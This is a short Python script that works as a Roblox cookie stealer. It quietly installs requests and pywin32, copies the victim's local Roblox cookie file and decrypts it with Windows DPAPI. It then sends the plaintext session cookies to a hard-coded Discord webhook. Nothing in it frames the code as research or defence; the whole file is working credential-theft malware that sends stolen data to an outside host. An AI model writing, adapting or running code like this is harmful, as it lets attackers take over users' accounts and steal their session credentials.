import subprocess
import sys

# List of all external libraries
packages = [
    "requests",   # requests
    "pywin32"     # win32crypt
]

def install_package(pkg):
    """Install a single pip package silently."""
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", pkg],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(f"{pkg} installed successfully.")
    except Exception as e:
        print(f"Failed to install {pkg}: {e}")

for pkg in packages:
    module_name = pkg.replace("-", "_")
    try:
        __import__(module_name)  # check if already installed
    except ImportError:
        install_package(pkg)

print("All required libraries installed!")






import os
import shutil
import json
import base64
import win32crypt
import requests

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)

        encoded_cookies = file_content.get("CookiesData", "")

        decoded_cookies = base64.b64decode(encoded_cookies)
        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')

        send_to_discord(f"\n```\n{decrypted_text}\n```")

    except Exception as e:
        send_to_discord(f"Error retrieving Roblox cookies: {e}")

def send_to_discord(message):
    WEBHOOK_URL = "https://discord.com/api/webhooks/1491394773867561070/3BoH3T2a08A75JW37rljMNg47rJc2x4xmqWYa4ButGcBqbcljqaGGeSIIDGIFjD1xNq0"  # Replace with your actual webhook URL
    payload = {"content": message}
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("")
    else:
        print(f"Failed: {response.status_code} {response.text}")

if __name__ == "__main__":
    retrieve_roblox_cookies()
